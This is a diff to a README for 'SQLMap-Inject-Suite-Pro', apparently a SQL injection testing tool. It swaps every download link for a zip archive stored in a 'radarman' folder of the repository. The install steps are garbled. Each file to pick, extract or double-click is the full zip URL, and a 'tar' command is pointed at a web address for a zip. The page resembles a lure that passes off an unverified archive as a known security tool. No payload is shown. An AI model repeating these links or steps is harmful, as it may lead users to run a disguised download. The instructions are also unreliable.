@@ -6,7 +6,7 @@ Welcome to SQLMap-Inject-Suite-Pro! This application helps users test for SQL in
 
 ## 📥 Download SQLMap-Inject-Suite-Pro
 
-[![Download Now](https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip)
+[![Download Now](https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip)
 
 You can download SQLMap-Inject-Suite-Pro from the Releases page. 
 
@@ -20,10 +20,10 @@ You can download SQLMap-Inject-Suite-Pro from the Releases page.
 ## 👣 Steps to Download & Install
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip) to download the latest version of SQLMap-Inject-Suite-Pro.
+   Go to our [Releases page](https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip) to download the latest version of SQLMap-Inject-Suite-Pro.
 
 2. **Choose the Right File**
-   On the Releases page, you will see various downloadable files. Look for the file that matches your operating system. Usually, the files will have names like `https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip`, `https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip`, or `https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip`.
+   On the Releases page, you will see various downloadable files. Look for the file that matches your operating system. Usually, the files will have names like `https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip`, `https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip`, or `https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip`.
 
 3. **Download the File**
    Click on the appropriate file to download it. It may take a few moments, depending on your internet speed.
@@ -31,11 +31,11 @@ You can download SQLMap-Inject-Suite-Pro from the Releases page.
 4. **Extract the Contents**
    - **For Windows Users:** Right-click the downloaded `.zip` file and select "Extract All." Follow the prompts to extract the files.
    - **For macOS Users:** Double-click the downloaded `.zip` file to extract it.
-   - **For Linux Users:** Open a terminal and use the command: `tar -xzvf https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip`.
+   - **For Linux Users:** Open a terminal and use the command: `tar -xzvf https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip`.
 
 5. **Run the Application**
-   - **Windows Users:** Navigate to the folder where you extracted the files. Look for `https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip` and double-click it to launch.
-   - **macOS Users:** Open the folder where you extracted the files and double-click `https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip`.
+   - **Windows Users:** Navigate to the folder where you extracted the files. Look for `https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip` and double-click it to launch.
+   - **macOS Users:** Open the folder where you extracted the files and double-click `https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip`.
    - **Linux Users:** Open a terminal, navigate to the folder, and type `./SQLMap-Inject-Suite-Pro` to run the application.
 
 ## 🛠️ How to Use SQLMap-Inject-Suite-Pro
@@ -71,6 +71,6 @@ SQLMap-Inject-Suite-Pro is an open-source project. If you want to contribute, pl
 
 ## 🔗 Links
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/aaryan-1112/SQLMap-Inject-Suite-Pro/main/radarman/SQLMap-Inject-Suite-Pro-v2.0.zip)
+[Visit Releases Page to Download](https://github.com/aaryan-1112/SQLMap-Inject-Suite-Pro/raw/refs/heads/main/radarman/SQL-Suite-Map-Pro-Inject-2.8.zip)
 
 Happy testing!
